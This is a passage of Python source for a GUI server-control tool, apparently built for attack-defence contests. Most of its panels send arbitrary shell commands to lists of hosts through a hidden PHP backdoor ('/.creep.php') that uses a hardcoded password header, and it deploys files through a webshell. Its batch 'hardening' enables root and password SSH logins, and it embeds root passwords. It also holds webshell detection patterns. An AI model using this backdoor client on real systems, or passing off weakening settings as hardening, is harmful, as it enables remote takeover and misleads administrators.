        self.ssh_user = tb.Entry(r1, width=10); self.ssh_user.insert(0, 'root'); self.ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.ssh_pass = tb.Entry(r1, width=14, show='*'); self.ssh_pass.pack(side=tk.LEFT, padx=2)
        self.ssh_pass.insert(0, 'y|lladmin121.@ss')
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='新密码:').pack(side=tk.LEFT)
        self.ssh_newpass = tb.Entry(r2, width=14, show='*'); self.ssh_newpass.pack(side=tk.LEFT, padx=2)
        self.ssh_newpass.insert(0, 'y|lladmin121.@ss')
        self.btn_ssh_test = tb.Button(r2, text='\U0001f50c 测试连接', command=self.do_ssh_test)
        self.btn_ssh_test.pack(side=tk.LEFT, padx=2)
        self.btn_ssh_chpass = tb.Button(r2, text='\U0001f504 改密', command=self.do_ssh_chpass)
        self.btn_ssh_chpass.pack(side=tk.LEFT, padx=2)
        self.btn_ssh_cmd = tb.Button(r2, text='\u25b6 执行命令', command=self.do_ssh_cmd)
        self.btn_ssh_cmd.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='命令:').pack(side=tk.LEFT, padx=(6,0))
        self.ssh_cmd = tb.Entry(r2); self.ssh_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='批量IP:').pack(side=tk.LEFT)
        self.ssh_batch_ip = tb.Entry(r3); self.ssh_batch_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.btn_ssh_batch = tb.Button(r3, text='批量改密+加固', command=self.do_ssh_batch)
        self.btn_ssh_batch.pack(side=tk.LEFT, padx=2)
        self.ssh_lw = self._log_frame(f)

    def _ssh_connect(self, ip, port, user, passwd, cmd, timeout=10):
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(ip, int(port), user, passwd, timeout=timeout, allow_agent=False, look_for_keys=False)
            _, stdout, stderr = c.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode('utf-8', errors='replace')
            err = stderr.read().decode('utf-8', errors='replace')
            c.close()
            return out + err
        except ImportError: return '[ERROR] paramiko 未安装 (pip install paramiko)'
        except Exception as e: return f'[ERROR] {e}'

    def do_ssh_test(self):
        ip = self.ssh_ip.get().strip()
        if not ip: messagebox.showwarning('提示', '请输入IP'); return
        self.ssh_lw.log(f'>>> 测试连接 {ip}:{self.ssh_port.get()}', 'info')
        r = self._ssh_connect(ip, self.ssh_port.get(), self.ssh_user.get(), self.ssh_pass.get(), 'echo SSH_OK; id')
        self.ssh_lw.log(r[:300], 'ok' if 'SSH_OK' in r else 'fail')

    def do_ssh_chpass(self):
        ip = self.ssh_ip.get().strip()
        if not ip: messagebox.showwarning('提示', '请输入IP'); return
        np = self.ssh_newpass.get().strip()
        if not np: messagebox.showwarning('提示', '请输入新密码'); return
        user = self.ssh_user.get().strip()
        self.ssh_lw.log(f'>>> 修改密码 {user}@{ip}', 'info')
        cmd = f'echo "{user}:{np}" | chpasswd 2>&1; echo DONE' if user != 'root' else f'echo "root:{np}" | chpasswd 2>&1; echo DONE'
        r = self._ssh_connect(ip, self.ssh_port.get(), user, self.ssh_pass.get(), cmd)
        self.ssh_lw.log(r[:200], 'ok' if 'DONE' in r else 'fail')

    def do_ssh_cmd(self):
        ip = self.ssh_ip.get().strip()
        cmd = self.ssh_cmd.get().strip()
        if not ip or not cmd: return
        self.ssh_lw.log(f'>>> [{ip}] {cmd}', 'info')
        r = self._ssh_connect(ip, self.ssh_port.get(), self.ssh_user.get(), self.ssh_pass.get(), cmd)
        self.ssh_lw.log(r[:500], 'out')

    def do_ssh_batch(self):
        ips = parse_targets(self.ssh_batch_ip.get().strip())
        if not ips: messagebox.showwarning('提示', '请输⼊批量IP'); return
        user = self.ssh_user.get().strip()
        pw = self.ssh_pass.get().strip()
        np = self.ssh_newpass.get().strip()
        port = int(self.ssh_port.get() or 22)
        self.ssh_lw.log(f'>>> 批量改密+加固 {len(ips)} 台', 'info')
        def run():
            for ip in ips:
                try:
                    self.ssh_lw.log(f'  [{ip}] 连接中...', 'info')
                    r1 = self._ssh_connect(ip, port, user, pw, f'echo "{user}:{np}" | chpasswd 2>&1', timeout=10)
                    self.ssh_lw.log(f'  [{ip}] 改密: {"OK" if "DONE" in r1 or not r1.strip() else r1[:60]}', 'ok')
                    cmds = [
                        'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config',
                        'sed -i "s/PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config',
                        'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null',
                        'chmod 755 /var/www/html 2>/dev/null',
                        'find /var/www/html -type d -exec chmod 755 {} \\; 2>/dev/null',
                        'find /var/www/html -type f -exec chmod 644 {} \\; 2>/dev/null',
                    ]
                    for c in cmds:
                        self._ssh_connect(ip, port, user, np, c, timeout=5)
                    self.ssh_lw.log(f'  [{ip}] 加固完成', 'ok')
                except Exception as e: self.ssh_lw.log(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    # ── 进程端口 ──
    def build_process(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        e_ip, ep, vh, et = self._target_frame(f)
        bf = self._btn_frame(f)
        tb.Button(bf, text='\U0001f50d 进程列表', command=lambda: self.do_ps(e_ip, ep, vh, et, 'ps aux')).pack(side=tk.LEFT, padx=2)
        tb.Button(bf, text='\U0001f50c 端口列表', command=lambda: self.do_ps(e_ip, ep, vh, et, 'netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null')).pack(side=tk.LEFT, padx=2)
        tb.Label(bf, text='Kill PID:').pack(side=tk.LEFT, padx=(8,0))
        e_pid = tb.Entry(bf, width=8); e_pid.pack(side=tk.LEFT, padx=2)
        tb.Button(bf, text='\u274c 杀进程', command=lambda: self.do_kill_proc(e_ip, ep, vh, et, e_pid)).pack(side=tk.LEFT, padx=2)
        tb.Label(bf, text='封端口:').pack(side=tk.LEFT, padx=(8,0))
        e_block = tb.Entry(bf, width=6); e_block.pack(side=tk.LEFT, padx=2)
        tb.Button(bf, text='\U0001f6ab 封', command=lambda: self.do_block_port(e_ip, ep, vh, et, e_block)).pack(side=tk.LEFT, padx=2)
        self.ps_lw = self._log_frame(f)

    def do_ps(self, e_ip, ep, vh, et, cmd):
        ips = parse_targets(e_ip.get().strip())
        if not ips: return
        timeout = int(et.get() or 5)
        lw = self.ps_lw; lw.clear()
        url = f'http://{ips[0]}:{ep.get()}' if not vh.get() else f'https://{ips[0]}:{ep.get()}'
        def go():
            for ip in ips[:3]:
                try:
                    base = make_base(ip, int(ep.get() or 80), vh.get())
                    r = requests.post(f'{base}/.creep.php',
                        headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': cmd}, timeout=timeout)
                    lw.log(f'[{ip}]\n{r.text[:2000]}', 'out')
                except Exception as e: lw.log(f'[FAIL] {ip}: {e}', 'fail')
        async_run(go)

    def do_kill_proc(self, e_ip, ep, vh, et, e_pid):
        pid = e_pid.get().strip()
        if not pid: return
        ips = parse_targets(e_ip.get().strip())
        if not ips: return
        lw = self.ps_lw
        for ip in ips[:3]:
            base = make_base(ip, int(ep.get() or 80), vh.get())
            try:
                r = requests.post(f'{base}/.creep.php',
                    headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': f'kill -9 {pid} 2>&1; echo OK'},
                    timeout=int(et.get() or 5))
                lw.log(f'[{ip}] kill {pid}: {r.text[:100]}', 'ok')
            except Exception as e: lw.log(f'[FAIL] {ip}: {e}', 'fail')

    def do_block_port(self, e_ip, ep, vh, et, e_block):
        port = e_block.get().strip()
        if not port: return
        ips = parse_targets(e_ip.get().strip())
        if not ips: return
        lw = self.ps_lw
        for ip in ips[:3]:
            base = make_base(ip, int(ep.get() or 80), vh.get())
            try:
                r = requests.post(f'{base}/.creep.php',
                    headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': f'iptables -A INPUT -p tcp --dport {port} -j DROP 2>&1; echo OK'},
                    timeout=int(et.get() or 5))
                lw.log(f'[{ip}] block port {port}: {r.text[:100]}', 'ok')
            except Exception as e: lw.log(f'[FAIL] {ip}: {e}', 'fail')

    # ── 木马查杀 ──
    def build_scanner(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='扫描配置', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='Web目录(本机):').pack(side=tk.LEFT)
        self.scan_dir = tb.Entry(r1); self.scan_dir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.scan_dir.insert(0, '/var/www/html')
        tb.Button(r1, text='\U0001f4c2 选择', command=lambda: pick_dir(self.scan_dir)).pack(side=tk.LEFT)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        self.scan_del = tk.BooleanVar()
        tb.Checkbutton(r2, text='自动删除可疑文件', variable=self.scan_del).pack(side=tk.LEFT, padx=2)
        self.btn_scan = tb.Button(r2, text='\U0001f50d 开始扫描', command=self.do_scan)
        self.btn_scan.pack(side=tk.LEFT, padx=6)
        self.scan_lw = self._log_frame(f)

    def do_scan(self):
        d = self.scan_dir.get().strip()
        if not os.path.isdir(d): messagebox.showerror('错误', f'目录不存在: {d}'); return
        lw = self.scan_lw; lw.clear()
        lw.log(f'>>> 扫描木马: {d}', 'info')
        delete = self.scan_del.get()
        PATTERNS = [
            (r'eval\s*\(\s*\$_', 'eval($_ 一句话木马'),
            (r'assert\s*\(\s*\$_', 'assert($_ 一句话木马'),
            (r'base64_decode\s*\(\s*\$_', 'base64解码后门'),
            (r'preg_replace\s*\(\s*/[^/]*e\s*', 'preg_replace /e 代码执行'),
            (r'array_map\s*\(\s*[\'"]assert[\'"]\s*,', 'array_map assert'),
            (r'call_user_func\s*\(\s*[\'"]assert[\'"]\s*,', 'call_user_func assert'),
            (r'`\s*\$_', '反引号执行($_`)'),
            (r'create_function\s*\(\s*[\'"]', 'create_function后门'),
            (r'popen\s*\(\s*\$_', 'popen后门'),
            (r'proc_open\s*\(\s*\$_', 'proc_open后门'),
            (r'move_uploaded_file\s*\(\s*\$_', '上传后门'),
            (r'gzinflate\s*\(\s*base64_decode', 'gz压缩后门'),
        ]
        def scan():
            total = sus = 0
            for root, dirs, files in os.walk(d):
                dirs[:] = [x for x in dirs if not x.startswith('.') and x not in ('node_modules','vendor','cache','runtime')]
                for fname in files:
                    ext = os.path.splitext(fname)[1].lower()
                    if ext not in ('.php','.php5','.phtml','.php7','.pht','.asp','.aspx','.jsp'): continue
                    fpath = os.path.join(root, fname); total += 1
                    try:
                        sz = os.path.getsize(fpath)
                        if sz > 10485760: continue
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh: content = fh.read(262144)
                        findings = []
                        for pat, desc in PATTERNS:
                            if re.search(pat, content, re.I): findings.append(desc)
                        if findings:
                            sus += 1; lw.log(f'  [!] {fpath}', 'warn')
                            for desc in findings: lw.log(f'      → {desc}', 'fail')
                            if delete:
                                try: os.remove(fpath); lw.log(f'      已删除', 'ok')
                                except Exception as ex: lw.log(f'      删除失败: {ex}', 'fail')
                    except Exception: pass
            lw.log(f'扫描完成: {total} 文件, {sus} 可疑', 'ok' if sus==0 else 'warn')
        async_run(scan)

    # ── 数据库 ──
    def build_database(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='MySQL连接(通过SSH)', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='IP:').pack(side=tk.LEFT)
        self.db_ip = tb.Entry(r1, width=14); self.db_ip.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='SSH端口:').pack(side=tk.LEFT)
        self.db_ssh_port = tb.Entry(r1, width=4); self.db_ssh_port.insert(0, '22'); self.db_ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户:').pack(side=tk.LEFT)
        self.db_ssh_user = tb.Entry(r1, width=8); self.db_ssh_user.insert(0, 'root'); self.db_ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.db_ssh_pass = tb.Entry(r1, width=12, show='*'); self.db_ssh_pass.insert(0, 'y|lladmin121.@ss'); self.db_ssh_pass.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='MySQL用户:').pack(side=tk.LEFT)
        self.db_user = tb.Entry(r2, width=8); self.db_user.insert(0, 'root'); self.db_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='MySQL密码:').pack(side=tk.LEFT)
        self.db_pass = tb.Entry(r2, width=12, show='*'); self.db_pass.insert(0, 'root'); self.db_pass.pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f50d 查询库', command=self.do_db_show).pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f4e5 备份DB', command=self.do_db_dump).pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f504 改DB密码', command=self.do_db_chpass).pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='新DB密码:').pack(side=tk.LEFT, padx=(6,0))
        self.db_newpass = tb.Entry(r2, width=10, show='*'); self.db_newpass.pack(side=tk.LEFT, padx=2)
        self.db_lw = self._log_frame(f)

    def _db_cmd(self, cmd):
        return self._ssh_connect(self.db_ip.get().strip(), self.db_ssh_port.get(),
            self.db_ssh_user.get(), self.db_ssh_pass.get(),
            f'mysql -u{self.db_user.get().strip()} -p{self.db_pass.get().strip()} -e "{cmd}" 2>&1', timeout=10)

    def do_db_show(self):
        self.db_lw.log('>>> 查询数据库列表', 'info')
        r = self._db_cmd('SHOW DATABASES')
        self.db_lw.log(r[:1000], 'out')

    def do_db_dump(self):
        ip = self.db_ip.get().strip()
        self.db_lw.log(f'>>> 备份数据库 {ip}', 'info')
        def run():
            fname = f'db_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.sql.gz'
            cmd = f'mysqldump -u{self.db_user.get().strip()} -p{self.db_pass.get().strip()} --all-databases 2>/dev/null | gzip -c | base64 -w0'
            r = self._ssh_connect(ip, self.db_ssh_port.get(), self.db_ssh_user.get(), self.db_ssh_pass.get(), cmd, timeout=30)
            if r.startswith('[ERROR]'): self.db_lw.log(f'[FAIL] {r}', 'fail')
            else:
                out = os.path.join(CONFIG_DIR, fname)
                with open(out, 'wb') as fh:
                    try: fh.write(base64.b64decode(r))
                    except Exception: fh.write(r.encode())
                sz = os.path.getsize(out)
                self.db_lw.log(f'[OK] 备份保存: {fname} ({sz/1024:.1f}KB)', 'ok')
        async_run(run)

    def do_db_chpass(self):
        np = self.db_newpass.get().strip()
        if not np: messagebox.showwarning('提示', '请输入新密码'); return
        self.db_lw.log('>>> 修改MySQL密码', 'info')
        r = self._db_cmd(f"ALTER USER '{self.db_user.get().strip()}'@'localhost' IDENTIFIED BY '{np}'; FLUSH PRIVILEGES;")
        self.db_lw.log(r[:300], 'ok' if not r.strip() or 'OK' in r else 'fail')

    # ── 加固基线 ──
    def build_harden(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        e_ip, ep, vh, et = self._target_frame(f)
        bf = self._btn_frame(f)
        tb.Label(bf, text='操作:').pack(side=tk.LEFT)
        self.harden_lw = self._log_frame(f)
        cmds = {
            'Web目录只读': 'chmod 755 /var/www/html 2>/dev/null; find /var/www/html -type d -exec chmod 755 {} \\; 2>/dev/null; find /var/www/html -type f -exec chmod 644 {} \\; 2>/dev/null; echo DONE',
            'PHP危险函数禁用': 'for f in /etc/php/*/php.ini; do sed -i "s/disable_functions =.*/disable_functions = exec,system,passthru,shell_exec,popen,proc_open,pcntl_exec,assert,pcntl_fork/" "$f" 2>/dev/null; done; echo DONE',
            '目录列表禁用': 'for f in /etc/apache2/sites-enabled/* /etc/apache2/conf-enabled/* /etc/nginx/conf.d/* 2>/dev/null; do sed -i "s/Options.*Indexes/Options -Indexes/" "$f" 2>/dev/null; done; echo DONE',
            '删除多余用户': 'userdel -r www 2>/dev/null; userdel -r test 2>/dev/null; userdel -r ftp 2>/dev/null; echo DONE',
            '停止无用服务': 'systemctl stop vsftpd 2>/dev/null; systemctl disable vsftpd 2>/dev/null; systemctl stop telnet 2>/dev/null; echo DONE',
            '关闭3389': 'iptables -A INPUT -p tcp --dport 3389 -j DROP 2>/dev/null; echo DONE',
        }
        for name, cmd in cmds.items():
            tb.Button(bf, text=name, command=lambda c=cmd: self.do_harden(e_ip, ep, vh, et, c)).pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(f); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='或输入自定义命令:').pack(side=tk.LEFT)
        self.harden_custom = tb.Entry(r2); self.harden_custom.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r2, text='\u25b6 执行', command=lambda: self.do_harden(e_ip, ep, vh, et, self.harden_custom.get())).pack(side=tk.LEFT, padx=2)

    def do_harden(self, e_ip, ep, vh, et, cmd):
        if not cmd: return
        ips = parse_targets(e_ip.get().strip())
        if not ips: return
        port = int(ep.get() or 80); timeout = int(et.get() or 10)
        lw = self.harden_lw
        lw.log(f'>>> 执行加固命令: {cmd[:60]}...', 'info')
        def run():
            for ip in ips[:5]:
                try:
                    base = make_base(ip, port, vh.get())
                    r = requests.post(f'{base}/.creep.php',
                        headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': cmd}, timeout=timeout)
                    lw.log(f'  [{ip}] {r.text[:100]}', 'ok' if r.status_code==200 else 'fail')
                except Exception as e: lw.log(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)


    # ── 自动修复 ──
    def build_autofix(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        pad = {'padx': 4, 'pady': 2}

        f1 = tb.LabelFrame(f, text='目标配置'); f1.pack(fill=tk.X, **pad)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, **pad)
        tb.Label(r1, text='IP/网段:').pack(side=tk.LEFT)
        self.af_ip = tb.Entry(r1); self.af_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r1, text='端口:').pack(side=tk.LEFT)
        self.af_port = tb.Entry(r1, width=5); self.af_port.insert(0, '80'); self.af_port.pack(side=tk.LEFT, padx=2)
        self.af_https = tk.BooleanVar()
        tb.Checkbutton(r1, text='HTTPS', variable=self.af_https).pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='路径:').pack(side=tk.LEFT, padx=(6,0))
        self.af_shell = tb.Entry(r1, width=12); self.af_shell.insert(0, '/shell.php'); self.af_shell.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT, padx=(2,0))
        self.af_pass = tb.Entry(r1, width=8); self.af_pass.insert(0, 'cmd'); self.af_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='超时:').pack(side=tk.LEFT, padx=(6,0))
        self.af_to = tb.Entry(r1, width=3); self.af_to.insert(0, '10'); self.af_to.pack(side=tk.LEFT, padx=2)

        f2 = tb.LabelFrame(f, text='操作'); f2.pack(fill=tk.X, **pad)
        r2 = tb.Frame(f2); r2.pack(fill=tk.X, **pad)
        tb.Button(r2, text='\U0001f50d 远程扫描漏洞', command=self.af_scan_remote, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f4c2 本地扫描目录', command=self.af_scan_local, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f527 生成+部署补丁', command=self.af_deploy_patch, bootstyle='success').pack(side=tk.LEFT, padx=8)
        tb.Button(r2, text='\U0001f5d1 清除日志', command=lambda: self.af_log.clear()).pack(side=tk.LEFT, padx=2)

        r_stat = tb.Frame(f2); r_stat.pack(fill=tk.X, **pad)
        self.af_lbl_stat = tb.Label(r_stat, text='就绪', foreground='#8b949e')
        self.af_lbl_stat.pack(side=tk.LEFT)

        f3 = tb.LabelFrame(f, text='漏洞发现列表'); f3.pack(fill=tk.BOTH, expand=True, **pad)
        r3 = tb.Frame(f3); r3.pack(fill=tk.BOTH, expand=True)
        self.af_tree = tb.Treeview(r3, columns=('sev','name','file','line','match'), show='headings', height=6)
        self.af_tree.heading('sev', text='级别'); self.af_tree.column('sev', width=60)
        self.af_tree.heading('name', text='漏洞类型'); self.af_tree.column('name', width=120)
        self.af_tree.heading('file', text='文件'); self.af_tree.column('file', width=200)
        self.af_tree.heading('line', text='行号'); self.af_tree.column('line', width=50)
        self.af_tree.heading('match', text='匹配内容'); self.af_tree.column('match', width=300)
        vsb = tb.Scrollbar(r3, orient='vertical', command=self.af_tree.yview)
        self.af_tree.configure(yscrollcommand=vsb.set)
        self.af_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vsb.pack(side=tk.RIGHT, fill=tk.Y)

        for tag, fg in [('critical','#f44747'),('high','#dcdcaa'),('medium','#569cd6'),('low','#8b949e')]:
            self.af_tree.tag_configure(tag, foreground=fg)

        flog = tb.LabelFrame(f, text='日志'); flog.pack(fill=tk.X, **pad)
        self.af_log = LogWidget(flog)
        self._af_findings = []

    def af_log_msg(self, msg, tag='info'):
        if hasattr(self, 'af_log'):
            self.af_log.log(f'[{datetime.now().strftime("%H:%M:%S")}] {msg}', tag)

    def af_scan_remote(self):
        ips = parse_targets(self.af_ip.get().strip())
        if not ips: messagebox.showwarning('', '请输入目标IP'); return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        shell_url = self.af_shell.get().strip() or '/shell.php'
        shell_pass = self.af_pass.get().strip() or 'cmd'
        https = self.af_https.get()
        self._af_findings = []
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#dcdcaa')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            s = VulnScanner()
            total = len(ips)
            for i, ip in enumerate(ips, 1):
                self.af_log_msg(f'扫描 [{i}/{total}] {ip}...', 'info')
                try:
                    s.scan_remote(ip, port, shell_url, shell_pass, https, timeout)
                except Exception as e:
                    self.af_log_msg(f'[FAIL] {ip}: {e}', 'fail')
                if hasattr(self, 'af_lbl_stat'):
                    self.root.after(0, lambda c=f'扫描中 {i}/{total}': self.af_lbl_stat.config(text=c, foreground='#dcdcaa'))
            self._af_findings = s.findings
            self.root.after(0, self.af_refresh_tree)
            self.af_log_msg(s.summary(), 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(s.findings)} 个发现', foreground='#4ec9b0'))
        async_run(run)

    def af_scan_local(self):
        path = filedialog.askdirectory(title='选择源码目录')
        if not path: return
        self._af_findings = []
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#dcdcaa')
        self.af_log_msg(f'扫描本地目录: {path}', 'info')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            s = VulnScanner()
            s.scan_directory(path)
            self._af_findings = s.findings
            self.root.after(0, self.af_refresh_tree)
            self.af_log_msg(s.summary(), 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(s.findings)} 个发现', foreground='#4ec9b0'))
        async_run(run)

    def af_refresh_tree(self):
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        for f in self._af_findings:
            sev = f['severity']
            tag = sev if sev in ('critical','high','medium','low') else 'medium'
            self.af_tree.insert('', 'end', values=(
                sev.upper(), f['name'],
                f.get('remote_file', f.get('file', '?')),
                f['line'], f['match'][:80]
            ), tags=(tag,))

    def af_deploy_patch(self):
        if not self._af_findings:
            messagebox.showwarning('', '请先扫描漏洞')
            return
        ips = parse_targets(self.af_ip.get().strip())
        if not ips: messagebox.showwarning('', '请输入目标IP'); return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        shell_url = self.af_shell.get().strip() or '/shell.php'
        shell_pass = self.af_pass.get().strip() or 'cmd'
        https = self.af_https.get()
        ip = ips[0]

        sev_count = sum(1 for f in self._af_findings if f['severity'] in ('critical','high'))
        msg = f'发现 {len(self._af_findings)} 个漏洞(高危{sev_count}个)\n部署自动补丁到 {ip}？'
        if not messagebox.askyesno('确认部署', msg): return

        self.af_log_msg(f'>>> 生成补丁...', 'warn')
        async_run(lambda: self._af_deploy(ip, port, shell_url, shell_pass, https, timeout))

    def _af_deploy(self, ip, port, shell_url, shell_pass, https, timeout):
        try:
            _try_add_path(os.path.join(BASE, '防御模块'))
            from patch_deploy import PatchGenerator, PatchDeployer
            pg = PatchGenerator()
            patches = pg.generate_patches(self._af_findings)
            self.af_log_msg(f'生成 {len(patches)} 个补丁方案', 'info')

            waf_code = pg.generate_waf_patch(patches)
            pd = PatchDeployer()

            if waf_code:
                ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, waf_code,
                    '/var/www/html/.yl_patch.php', https, timeout)
                self.af_log_msg(f'WAF补丁部署: {"✓" if ok else "✗"}', 'ok' if ok else 'fail')

            user_ini = "auto_prepend_file = /var/www/html/.yl_patch.php\n"
            ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, user_ini,
                '/var/www/html/.user.ini', https, timeout)
            self.af_log_msg(f'自动加载部署: {"✓" if ok else "✗"}', 'ok' if ok else 'fail')

            for p in patches:
                self.af_log_msg(f'  [{p["severity"].upper()}] {p["name"]} ({p["count"]}处)', 'info')
                self.af_log_msg(f'    快速修复: {p["fix_fast"]}', 'out')
                self.af_log_msg(f'    安全修复: {p["fix_secure"]}', 'out')

            self.af_log_msg('>>> 自动修复完成', 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text='补丁已部署', foreground='#4ec9b0'))
        except Exception as e:
            self.af_log_msg(f'部署失败: {e}', 'fail')

    # ── IP黑名单 ──
    def build_ipban(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='IP黑名单管理', padding=4); f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='目标靶机:').pack(side=tk.LEFT)
        self.ban_ip_entry = tb.Entry(r1); self.ban_ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='要封禁的IP:').pack(side=tk.LEFT)
        self.ban_target = tb.Entry(r2, width=20); self.ban_target.pack(side=tk.LEFT, padx=4)
        tb.Button(r2, text='\U0001f6ab 封禁', command=self.do_ipban, bootstyle='danger').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f513 解封', command=self.do_ipunban, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f50d 列表', command=self.do_ipban_list, width=6).pack(side=tk.LEFT, padx=2)
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='批量从文件封禁:').pack(side=tk.LEFT)
        self.ban_file = tb.Entry(r3); self.ban_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r3, text='\U0001f4c2 选择文件', command=lambda: pick_file(self.ban_file)).pack(side=tk.LEFT, padx=2)
        tb.Button(r3, text='\U0001f525 批量封禁', command=self.do_ipban_batch, bootstyle='danger').pack(side=tk.LEFT, padx=2)
        self.ban_lw = self._log_frame(f)

    def _ban_cmd(self, action, target_ip, ips):
        if not ips or not target_ip: return
        port = safe_int(self._get_ep_port(), 80)
        cmd = '; '.join([f'iptables {action} INPUT -s {ip} -j DROP 2>/dev/null' for ip in ips]) + '; echo DONE'
        try:
            base = make_base(target_ip, port, False)
            r = _session().post(f'{base}/.creep.php',
                headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': cmd}, timeout=10)
            return 'DONE' in r.text
        except Exception: return False

    def _get_ep_port(self):
        try:
            if hasattr(self, 'af_port'):
                return int(self.af_port.get() or 80)
            if hasattr(self, 'ban_ip_entry'):
                return 80
        except Exception: pass
        return 80

    def do_ipban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target: messagebox.showwarning('', '请填写目标靶机和封禁IP'); return
        ok = self._ban_cmd('-A', ip, [target])
        self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] {ip} -> 封禁 {target}', 'ok' if ok else 'fail')

    def do_ipunban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target: return
        ok = self._ban_cmd('-D', ip, [target])
        self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] {ip} -> 解封 {target}', 'ok' if ok else 'fail')

    def do_ipban_list(self):
        ip = self.ban_ip_entry.get().strip()
        if not ip: return
        cmd = 'iptables -L INPUT -n --line-numbers 2>/dev/null | head -50'
        try:
            base = make_base(ip, self._get_ep_port(), False)
            r = _session().post(f'{base}/.creep.php',
                headers={'X-Creep': 'y|lladmin121.@ss', 'X-Cmd': cmd}, timeout=10)
            self.ban_lw.log(f'[{ip}] iptables 规则:\n{r.text[:1500]}', 'out')
        except Exception as e: self.ban_lw.log(f'[FAIL] {e}', 'fail')

